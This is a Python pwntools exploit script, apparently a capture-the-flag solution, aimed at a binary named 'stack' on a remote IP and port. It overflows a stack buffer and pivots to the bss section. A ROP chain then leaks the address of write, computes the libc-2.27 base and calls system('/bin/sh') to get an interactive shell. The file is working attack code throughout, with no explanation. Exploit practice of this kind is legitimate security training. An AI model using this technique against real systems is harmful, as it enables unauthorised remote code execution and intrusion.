from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'

#p = process('./stack')
p = remote('43.156.14.141',1153)

elf = ELF('./stack')
libc = ELF('./libc/libc-2.27.so')

def d():
    gdb.attach(p,'''
    b read
    continue
    '''
    )


bss_addr = elf.bss()
bss_addr1 = bss_addr + 0x100
bss_addr2 = bss_addr + 0x200

pop_rdi = 0x400733
pop_rsi_pop = 0x400731
ret = 0x40050e
main = 0x400637
read = 0x4006AF

payload = b'a' * 0x60 + p64(bss_addr1) + p64(read)

p.sendafter(b': ',payload)

payload1 = b'a' * 0x60 + p64(bss_addr1 + 0x60) + p64(read)
p.send(payload1)

payload2 = p64(bss_addr1 + 0x70) + p64(pop_rdi) + p64(1) + p64(pop_rsi_pop) + p64(0x601018) + p64(0) + p64(0x400520) + p64(main)
p.send(payload2)


write_addr = u64(p.recvuntil('\x7f',drop = False).ljust(8,b'\x00'))
p.recv()
print('write addr is ' + hex(write_addr))

base = write_addr - libc.sym['write']
#print(hex(base))

a = [0x4f2a5,0x4f302,0x10a2fc]
one = base + a[2]

sys = base + libc.sym['system']
binsh = base + next(libc.search(b'/bin/sh\x00'))

payload3 = b'a' * 0x60 + p64(bss_addr2) + p64(read)
p.send(payload3)

payload4 = b'a' * 0x60 + p64(bss_addr2 + 0x60) + p64(read)
p.send(payload4)

payload5 = p64(bss_addr2 + 0x70) + p64(pop_rdi) + p64(binsh) + p64(sys) + p64(main)
p.send(payload5)

#d()

p.interactive()

